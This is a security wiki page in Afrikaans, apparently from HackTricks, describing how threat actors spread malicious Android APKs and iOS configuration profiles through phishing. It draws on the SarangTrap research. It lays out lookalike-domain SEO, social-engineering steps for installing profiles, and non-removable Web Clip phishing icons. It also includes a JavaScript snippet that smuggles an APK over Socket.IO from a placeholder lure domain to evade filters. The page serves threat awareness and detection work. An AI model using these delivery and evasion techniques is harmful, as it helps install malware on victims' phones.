# Mobiele phishing en verspreiding van kwaadwillige toepassings (Android en iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat bedreigingsakteurs gebruik om **kwaadwillige Android-APK's** en **iOS-mobielekonfigurasieprofiele** deur phishing te versprei (SEO, sosiale manipulasie, vals winkels, dating-apps, ens.).
> Die materiaal is aangepas uit die SarangTrap-veldtog wat Zimperium zLabs (2025) blootgelê het, en ander openbare navorsing.<sup>[[1]](#references)</sup>

## Aanvalvloei

1. **SEO-/phishing-infrastruktuur**
   * Registreer tientalle domeine wat soortgelyk lyk (dating, wolkdeling, motordiens…).  
     – Gebruik sleutelwoorde in die plaaslike taal en emoji's in die `<title>`-element om hoër in Google se ranglys te verskyn.  
     – Hou *beide* Android (`.apk`)- en iOS-installasie-instruksies op dieselfde bestemmingsbladsy.
2. **Eerste-fase-aflaai**
   * Android: direkte skakel na 'n *ongesigned* APK of een van 'n “derdepartywinkel”.  
   * iOS: `itms-services://`- of gewone HTTPS-skakel na 'n kwaadwillige **mobileconfig**-profiel (sien hieronder).
3. **Android-gedrag ná installasie**
   * C2-beheerde uitvoering, misbruik van toestemmings, omseiling van droppers, agtergrondinsameling en ander malwaregedrag ná installasie word op die toegewyde Android Malware Post-Exploitation-bladsy hieronder behandel.
4. **iOS-afleweringstegniek**
   * 'n Enkele **mobielekonfigurasieprofiel** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. aanvra om die toestel by “MDM”-agtige toesig in te skryf.  
   * Instruksies vir sosiale manipulasie:
     1. Maak Settings ➜ *Profile downloaded* oop.
     2. Tik drie keer op *Install* (skermskote op die phishing-bladsy).  
     3. Vertrou die ongetekende profiel ➜ aanvaller kry *Contacts*- en *Photo*-regte sonder App Store-hersiening.
5. **iOS Web Clip-loonvrag (phishing-toepassingsikoon)**
   * `com.apple.webClip.managed`-loonvragte kan **'n phishing-URL met 'n handelsmerkikoon/-etiket aan die tuisskerm vaspen**.
   * Web Clips kan **volskerm** loop (verberg die blaaier-koppelvlak) en as **nie-verwyderbaar** gemerk word, wat die slagoffer dwing om die profiel te verwyder om die ikoon te verwyder.<sup>[[3]](#references)</sup>
6. **Netwerklaag**
   * Gewone HTTP, dikwels op poort 80 met 'n HOST-kopskrif soos `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om raak te sien).

## Android-malware-uitbuiting ná installasie

Vir Android-malwaretegnieke ná installasie, soos C2, misbruik van Accessibility, oorlegsels, ATS-outomatisering, gefaseerde DEX-laai, premium SMS en volharding, sien:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-smokkelary via Socket.IO/WebSocket + vals Google Play-bladsye

Aanvallers vervang toenemend statiese APK-skakels met 'n Socket.IO/WebSocket-kanaal wat in Google Play-agtige lokmiddels ingebed is. Dit verberg die loonvrag-URL, omseil URL-/uitbreidingsfilters en behou 'n realistiese installasie-ervaring.<sup>[[2]](#references)[[4]](#references)</sup>

Tipiese kliëntvloei wat in die natuur waargeneem is:

<details>
<summary>Socket.IO-valslêer vir Play-aflaai (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Waarom dit eenvoudige beheermaatreëls ontduik:
- Geen statiese APK-URL word blootgestel nie; die payload word uit WebSocket-rame in die geheue gerekonstrueer.
- URL-/MIME-/uitbreidingsfilters wat direkte .apk-antwoorde blokkeer, mis dalk binêre data wat via WebSockets/Socket.IO getonnel word.
- Crawlers en URL-sandkaste wat nie WebSockets uitvoer nie, sal nie die payload ophaal nie.

Sien ook WebSocket-tegnieke en gereedskap:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Die donker kant van romanse: SarangTrap-afpersingsveldtog](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Web Clips-payloadinstellings vir Apple-toestelle](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker-Trojaan gerig op Indonesiese en Viëtnamese Android-gebruikers](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
